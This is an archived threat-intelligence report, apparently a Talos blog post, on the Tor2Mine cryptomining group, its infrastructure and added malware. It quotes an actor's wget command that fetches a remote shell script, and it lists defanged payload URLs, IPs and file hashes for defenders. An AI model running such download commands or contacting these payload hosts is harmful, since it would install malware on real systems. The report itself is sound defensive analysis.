{
    "id": "ed3f0ebf-4ada-41ff-bbaa-11b4b09ea848",
    "created_at": "2023-01-12T15:07:32.074887Z",
    "updated_at": "2025-03-27T02:05:58.549248Z",
    "deleted_at": null,
    "sha1_hash": "20242eaf54c7b9e1c6e6495ed2ef211b90691654",
    "title": "2020-06-11 - Tor2Mine is up to their old tricks — and adds a few new ones",
    "authors": "",
    "file_creation_date": "2022-05-28T15:49:55Z",
    "file_modification_date": "2022-05-28T15:49:55Z",
    "file_size": 1268107,
    "plain_text": "# Tor2Mine is up to their old tricks — and adds a few new ones\n\n**[blog.talosintelligence.com/2020/06/tor2mine-is-up-to-their-old-tricks-and_11.html](https://blog.talosintelligence.com/2020/06/tor2mine-is-up-to-their-old-tricks-and_11.html)**\n\n_By_ _[Kendall McKay and](https://twitter.com/kkmckay22)_ _[Joe Marshall.](https://twitter.com/ImmortanJo3)_\n\n## Threat summary\n\n\n-----\n\nCisco Talos has identified a resurgence of activity by Tor2Mine, a cryptocurrency\nmining group that was likely last active in 2018. Tor2Mine is deploying additional\nmalware to harvest credentials and steal more money, including AZORult, an\ninformation-stealing malware; the remote access tool Remcos; the DarkVNC backdoor\ntrojan; and a clipboard cryptocurrency stealer.\nThe actors are also using a new IP address and two new domains to carry out their\noperations.\nThe addition of new tactics, techniques, and procedures (TTPs) suggest Tor2Mine is\nseeking ways to diversify their revenue in a volatile cryptocurrency market.\n\n### What’s new?\n\nTor2Mine has traditionally been a cryptocurrency mining malware actor notorious for infecting\nvictims with cryptominers that steal system resources to mine currency. In a new\ndevelopment, the Tor2Mine actors have incorporated additional malware into their\noperations, likely as a way to diversify revenue streams and stay relevant in a COVID-19\nworld where cryptocurrencies are fluctuating wildly.\n\n### So what?\n\nBetween January and June 2020, Cisco Talos observed resurgent activity from Tor2Mine, a\nprofit-driven actor that remains active despite a global economic recession and volatile\ncryptocurrency market. To address these challenges, Tor2Mine, a group traditionally known\nto deliver cryptocurrency mining malware, has begun using additional malware to harvest\nvictims’ credentials and steal more money. The addition of new TTPs, as well as the use of\nnew infrastructure, highlights Tor2Mine’s resilience in a challenging threat environment.\nThese developments also underscore threat actors’ persistence more broadly and should\nserve as a reminder that organizations must maintain heightened security at all times.\n\nWhat makes the Tor2Mine group notable is their use of Tor2web for command and control\n(C2) for their malware infections. The Tor2web services act as a bridge between the internet\nand the Tor network, a system that allows users to enable anonymous communication.\nThese services are useful for malware authors because they eliminate the need for malware\nto communicate with the Tor network directly, which is suspicious and may be blocked, and\nallow the C2 server's IP address to be hidden.\n\n### Analysis\n\nTalos recently identified activity in our endpoint telemetry associated with Tor2Mine affecting\nat least six different companies. The activity has been ongoing since January 2020,\nresurfacing after a likely year-long hiatus since we first identified the threat actor in\n[December 2018. While much of the infrastructure remains the same, we identified a new IP](https://blog.talosintelligence.com/2018/12/cryptomining-campaigns-2018.html)\nand two domains that we assess are currently being leveraged by Tor2Mine. During the\ncourse of our research, we also discovered evidence suggesting that the Tor2Mine actors\n\n\n-----\n\nare deploying additional malware in tandem with XMRig during their operations to harvest\ncredentials and steal more money. The new malware includes AZORult, an informationstealing malware; the remote access tool Remcos; the DarkVNC backdoor trojan; and a\nclipboard cryptocurrency stealer.\n\n### Tor2Mine resurfaces\n\nIn much of this recent activity, the actors use previously identified infrastructure to carry out\ntheir operations. In one cluster of activity against a telecommunications company, we\nobserved the attacker executing PowerShell commands to download files from multiple\nTor2Mine-related domains. The attacker attempts to run Microsoft HTML Applications (HTA)\nfrom multiple URLs (listed below) using Mshta, a utility for executing HTA files:\n\nhxxps[:]//qm7gmtaagejolddt[.]onion[.]to/check[.]hta\nhxxp[:]//res1[.]myrms[.]pw/upd[.]hta\nhxxp[:]//eu1[.]minerpool[.]pw/check[.]hta\n\nThe qm7gmtaagejolddt[.]onion[.] domain is a known Tor2web gateway used by Tor2Mine\n[actors to proxy communications. According to our previously mentioned blog, the actors](https://blog.talosintelligence.com/2018/12/cryptomining-campaigns-2018.html)\nhave been using this domain since at least 2018. The res1[.]myrms[.]pw domain also\nappears to have connections to Tor2Mine, as it is hosted on an IP address\n(107[.]181[.]187[.]132) previously known to be used by Tor2Mine actors. In the activity\noutlined in our 2018 blog, Tor2Mine actors used a PowerShell script to install follow-on\nmalware onto the compromised system from this same IP. The eu1[.]minerpool[.]pw, also\nhosted on 107[.]181[.]187[.]132, is the same mining pool the actors used in the 2018 activity.\n\nThe actor also used a PowerShell command to download a .ps1 file from\nhxxp[:]//v1[.]fym5gserobhh[.]pw/v1/check1[.]ps1. The v1[.]fym5gserobhh[.]pw domain is\nhosted on the same aforementioned IP. According to Umbrella data, v1[.]fym5gserobhh[.]pw\nand eu1[.]minerpool[.]pw are registered under two different reg[.]ru nameservers\n(ns2[.]reg[.]ru and ns1[.]reg[.]ru).\n\n### New infrastructure identified\n\nWhile we identified many of the same domains and IP addresses being used from 2018 in\nthis more recent activity, we also identified several new indicators of compromise (IOCs) that\nwere not previously associated with Tor2Mine. In similar activity related to another company\nin mid-May, we saw the actors using Mshta to execute HTA files from many of the same\nURLs mentioned above. However, we also observed a new domain, eu1[.]ax33y1mph[.]pw,\nin activity affecting an environmental consulting company between April and May 2020. The\ndomain is hosted on the same 107[.]181[.]187[.]132 IP address and was first seen in March\n2020, according to Umbrella, suggesting this is a relatively new component of the attacker’s\ninfrastructure.\n\n\n-----\n\nUmbrella data showing the DNS resolution information for eu1[.]ax33y1mph[.]pw\n\nAs our research progressed, we continued to identify related threat activity against several\nmore companies involving the use of new Tor2Mine infrastructure. We identified a new IP,\n185[.]10[.]68[.]147, hosting at least two domains, asq[.]r77vh0[.]pw and asq[.]d6shiiwz[.]pw,\nthat we assess are part of Tor2Mine’s infrastructure. The asq[.]r77vh0[.]pw domain is\nregistered under the same two previously mentioned reg[.]ru providers. It first appeared in\nour endpoint telemetry for two days in July 2019 but did not reappear until late February\n2020. This domain was previously hosted on 107[.]181[.]160[.]197, an IP used by Tor2Mine\nactors, according to our 2018 blog.\n\nThe asq[.]r77vh0[.]pw domain also has at least one referring file\n(67f5f339c71c9c887dfece5cb6e2ab698b8c8a575d1ab9dd37ac32232be1aa04) that reaches\nout to both the older 107[.]181[.]160[.]197 IP and the newly identified 185[.]10[.]68[.]147 IP,\nbolstering the notion that 185[.]10[.]68[.]147 is an extension of Tor2Mine’s infrastructure.\n\n_Cisco Umbrella showing a spike in DNS requests for asq[.]r77vh0[.]pw._\n\nThe asq[.]d6shiiwz[.]pw domain is also registered under the same two reg[.]ru hosting\nproviders. According to VirusTotal, this domain has hosted several URLs that are lexically\nsimilar to previously identified Tor2Mine URLs, such as those ending in “.hta” and\n“checking.ps1”. Two such examples are hxxp[:]//asq[.]d6shiiwz[.]pw/win/hssl/d6[.]hta and\nhxxps[:]//asq[.]d6shiiwz[.]pw/win/checking[.]ps1. Both domains were also previously hosted\n\n\n-----\n\non the same IP address, 195[.]123[.]234[.]33, which also hosts malicious payloads\nassociated with XMRig.\n\nWe first observed these domains being hosted on 185[.]10[.]68[.]147 on March 15, 2020,\naccording to Umbrella, and they remain associated as of this writing. This IP also hosts\nfh[.]fhcwk4q[.]xyz, a domain associated with XMRigCC, a variant of XMRig leveraged by\nmany different threat actors. In addition to these domains, we also found several URLs\nhosted on 185[.]10[.]68[.]147 in VirusTotal that are structurally similar to many of the\naforementioned Tor2Mine URLs, such as hxxp[:]//185[.]10[.]68[.]147/win/update[.]hta and\nhxxp[:]//185[.]10[.]68[.]147/win/del[.]ps1. As previously noted, Tor2Mine actors were\nobserved using PowerShell commands to download .ps1 files and Mshta to execute .hta\nfiles.\n\nThe IP also has a communicating Shell script file\n(4d21cab49f7d7dd7d39df72b244a249277c37b5561e74420dfc96fb22c8febac). The content\nof this file includes a string with a wget request to hxxp[:]//asq[.]r77vh0[.]pw/lin/update[.]sh.\nFrom there, we identified a file\n(daa768e8d66aa224491000e891f1ef2cb7c674df2f3097fef7db90d692e2f539) in VirusTotal\nwhose content shows an identical wget request (“wget --user-agent \"linux\" -q -O hxxp://asq[.]r77vh0[.]pw/lin/update[.]sh”). This file reaches out to the aforementioned\n195[.]123[.]234[.]33, an XMRigCC IP that previously hosted the newly identified domains,\naccording to VirusTotal and Umbrella, respectively.\n\n_File containing the Tor2Mine IP and domain._\n\nUsing the same approach, we identified several other files that also had this string in their\ncontents. One such file,\n3c2d83b9e9b1b107c3db1185229865b658bbaebc8020c1b2a4f9155ca87858fc, has\nembedded URLs that are hosted on 107[.]181[.]187[.]132 (e.g.,\nhxxp[:]//107[.]181[.]160[.]197/lin/32/xmrig), which we previously mentioned is a known\nTor2Mine IP. These connections to the older Tor2Mine infrastructure further suggests that\n185[.]10[.]68[.]147 is a new IP used by the same actors.\n\n### New malware added to the mix\n\n\n-----\n\nDuring the course of our research, we discovered evidence suggesting that the Tor2Mine\n[actors are deploying AZORult and other malware in tandem with XMRig during their](https://blog.talosintelligence.com/2020/04/azorult-brings-friends-to-party.html)\noperations to harvest credentials and steal more money. [Our previous research from April](https://blog.talosintelligence.com/2020/04/azorult-brings-friends-to-party.html)\n2020 outlined a complex campaign with several different executable payloads focused on\nobtaining money for the attackers. The campaign included the use of a variant of AZORult,\n[an information-stealing malware; as well as the RAT Remcos; the DarkVNC backdoor trojan;](https://blog.talosintelligence.com/2018/08/picking-apart-remcos.html)\nand a clipboard cryptocurrency stealer. Much of the infrastructure mentioned in the April blog\noverlaps with many of the new Tor2Mine IOCs we identified. According to the blog, there\nwere several domains referenced in the configuration for an XMRigCC payload during these\ncampaigns, including eu[.]minerpool[.]pw and rs[.]fym5gserobhh[.]pw, both lexically similar to\nthe eu1[.]minerpool[.]pw and v1[.]fym5gserobhh[.]pw domains we discovered in our recent\nresearch. The configuration also mentioned 185[.]10[.]68[.]220, our newly identified Tor2Mine\nIP.\n\nIn addition to these similarities, the April blog also mentions the AZORult actors downloading\nXMRig from 195[.]123[.]234[.]33, which previously hosted the two newly identified Tor2Mine\ndomains, asq[.]r77vh0[.]pw and asq[.]d6shiiwz[.]pw. Furthermore, these two domains were\nalso used by the actors outlined in the April blog. The URLs associated with these domains\nare structurally similar to many of the URLs we observed during the course of our recent\nTor2Mine discoveries, including hxxps://asq[.]r77vh0[.]pw/win/checking[.]ps1 and\nhxxps://asq[.]d6shiiwz[.]pw/win/hssl/d6[.]hta.\n\nThe likely addition of AZORult and additional malware to Tor2Mine’s tactics, techniques, and\nprocedures (TTPs) shows that the actors remain active and continue to look for ways to\nupdate their capabilities to increase their monetary gain. Notably, the Tor2Mine activity from\nthis year is consistent with a general uptick in cryptocurrency miners observed by Talos over\nthe last several months, including a resurgence in PowerGhost and MyKings.\n\n### The big picture\n\nMany bad actors, like Tor2Mine, who distribute malware for profit often have operational\nchallenges that are similar to many legitimate global enterprises, such as product creation,\ndistribution, overhead, infrastructure, supply chain and resilient revenue streams. As we\nhave seen in the Tor2Mine activity, financially motivated cyber threat actors will continue to\nreinvent themselves and find new methods of generating revenue, as their survival depends\non it. If crytominers cease to be profitable enough for the operators, bad actors will probably\ndiversify their attack portfolios to include even more dangerous threats like ransomware.\nUltimately, just as organizations have to adapt to a continually changing environment to stay\nin business, malware distribution groups must also remain agile and respond to new\nchallenges.\n\n\n-----\n\n[Advanced Malware Protection (AMP) is ideally suited to prevent the execution of the](https://www.cisco.com/c/en/us/products/security/advanced-malware-protection)\nmalware used by these threat actors. Exploit Prevention present within AMP is designed to\nprotect customers from unknown attacks such as this automatically.\n\n[Cisco Cloud Web Security (CWS) or Web Security Appliance (WSA) web scanning prevents](https://www.cisco.com/c/en/us/products/security/cloud-web-security/index.html)\naccess to malicious websites and detects malware used in these attacks.\n\n[Email Security can block malicious emails sent by threat actors as part of their campaign.](https://www.cisco.com/c/en/us/products/security/email-security-appliance/index.html)\n\n[Network Security appliances such as Next-Generation Firewall (NGFW), Next-Generation](https://www.cisco.com/c/en/us/products/security/firewalls/index.html)\n[Intrusion Prevention System (NGIPS), Cisco ISR, and Meraki MX can detect malicious](https://www.cisco.com/c/en/us/products/security/intrusion-prevention-system-ips/index.html)\nactivity associated with this threat.\n\n[AMP Threat Grid helps identify malicious binaries and build protection into all Cisco Security](https://www.cisco.com/c/en/us/solutions/enterprise-networks/amp-threat-grid/index.html)\nproducts.\n\n[Umbrella, our secure internet gateway (SIG), blocks users from connecting to malicious](https://umbrella.cisco.com/)\ndomains, IPs, and URLs, whether users are on or off the corporate network.\n\nOpen Source Snort Subscriber Rule Set customers can stay up to date by downloading the\n[latest rule pack available for purchase on Snort.org.](https://www.snort.org/products)\n\n## IOCs\n\n**Domains**\n\n\n-----\n\nv1[.]fym5gserobhh[.]pw\nres1[.]myrms[.]pw\neu1[.]minerpool[.]pw\neu1[.]ax33y1mph[.]pw\nasq[.]r77vh0[.]pw\nasq[.]d6shiiwz[.]pw\n\n**IPs**\n\n107[.]181[.]187[.]132\n\n185[.]10[.]68[.]147\n\n195[.]123[.]234[.]33\n\n**URLs**\n\nhxxp[:]//v1.fym5gserobhh.pw/php/func.php\n\nhxxp[:]//v1.fym5gserobhh.pw/v1/check1.ps1\n\nhxxp[:]//eu1.minerpool.pw/check.hta\n\nhxxp[:]//eu1.minerpool.pw/upd.hta\n\nhxxp[:]//eu1.minerpool.pw/rckl/check.hta\n\nhxxp[:]//res1.myrms.pw/upd.hta\n\nhxxps[:]//eu1.ax33y1mph.pw/check.hta\n\nhxxps[:]//qm7gmtaagejolddt.onion.to/check.hta\n\nhxxps[:]//asq.r77vh0.pw/win/hssl/r7.hta\n\nhxxps[:]//asq.r77vh0.pw/win/php/func.php\n\nhxxp[:]//asq.r77vh0.pw/win/checking.hta\n\nhxxp[:]//asq.d6shiiwz.pw/win/hssl/d6.hta\n\nhxxps[:]//asq.d6shiiwz.pw/win/checking.ps1\n\nhxxp[:]//107.181.160.197/lin/32/xmrig\n\nhxxp[:]//185.10.68.147/win/update.hta\n\nhxxp[:]//185.10.68.147/win/del.ps1qm7gmtaagejolddt.onion.to\n\n**File hashes**\n\n67f5f339c71c9c887dfece5cb6e2ab698b8c8a575d1ab9dd37ac32232be1aa04\n\n4d21cab49f7d7dd7d39df72b244a249277c37b5561e74420dfc96fb22c8febac\n\n3c2d83b9e9b1b107c3db1185229865b658bbaebc8020c1b2a4f9155ca87858fc\n\ndaa768e8d66aa224491000e891f1ef2cb7c674df2f3097fef7db90d692e2f539\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2020/2020-06-11 - Tor2Mine is up to their old tricks — and adds a few new ones.pdf"
    ],
    "report_names": [
        "2020-06-11 - Tor2Mine is up to their old tricks — and adds a few new ones.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673536052,
    "ts_updated_at": 1743041158,
    "ts_creation_date": 1653752995,
    "ts_modification_date": 1653752995,
    "files": {
        "pdf": "https://archive.orkl.eu/20242eaf54c7b9e1c6e6495ed2ef211b90691654.pdf",
        "text": "https://archive.orkl.eu/20242eaf54c7b9e1c6e6495ed2ef211b90691654.txt",
        "img": "https://archive.orkl.eu/20242eaf54c7b9e1c6e6495ed2ef211b90691654.jpg"
    }
}